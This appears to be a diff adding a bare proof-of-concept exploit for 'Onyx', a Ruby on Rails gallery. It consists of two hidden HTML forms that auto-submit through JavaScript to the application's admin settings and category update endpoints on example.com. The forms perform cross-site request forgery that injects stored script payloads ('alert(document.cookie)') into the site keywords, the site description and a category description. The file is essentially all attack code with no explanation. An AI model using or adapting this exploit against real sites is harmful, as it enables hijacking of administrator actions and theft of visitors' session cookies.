@@ -1,0 +1,39 @@
+&lt;form action=&quot;http://www.example.com/admin/settings/update&quot; method=&quot;post&quot; name=&quot;main&quot; &gt;
+
+&lt;input type=&quot;hidden&quot; name=&quot;setting[site_title]&quot; value=&quot;My Onyx Gallery&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;setting[site_keywords]&quot; value='Ruby on Rails Gallery&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;' /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;setting[site_description]&quot; value='Onyx is an open source free ruby on rails gallery&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;' /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;setting[welcome_title]&quot; value=&quot;Welcome!&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;setting[welcome_message]&quot; value=&quot;Welcome to my gallery!&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;setting[uniform_width]&quot; value=&quot;500&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;setting[uniform_height]&quot; value=&quot;500&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;setting[thumbnail_width]&quot; value=&quot;100&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;setting[thumbnail_height]&quot; value=&quot;100&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;setting[dummy_watermark_enabled]&quot; value=&quot;0&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;setting[tooltips_enabled]&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;setting[tooltip_width]&quot; value=&quot;300&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;setting[maximum_uploadable_files]&quot; value=&quot;10&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;commit&quot; value=&quot;Update Settings&quot; /&gt;
+
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
+
+
+
+&lt;form action=&quot;http://www.example.com/admin/categories/update/1&quot; method=&quot;post&quot; name=&quot;main&quot; &gt;
+
+&lt;input type=&quot;hidden&quot; name=&quot;category[name]&quot; value=&quot;General&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;category[description]&quot; value='My Pictures&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;' /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;category[created_at(1i)]&quot; value=&quot;2010&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;category[created_at(2i)]&quot; value=&quot;7&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;category[created_at(3i)]&quot; value=&quot;23&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;category[created_at(4i)]&quot; value=&quot;04&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;category[created_at(5i)]&quot; value=&quot;00&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;commit&quot; value=&quot;Edit&quot; /&gt;
+
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
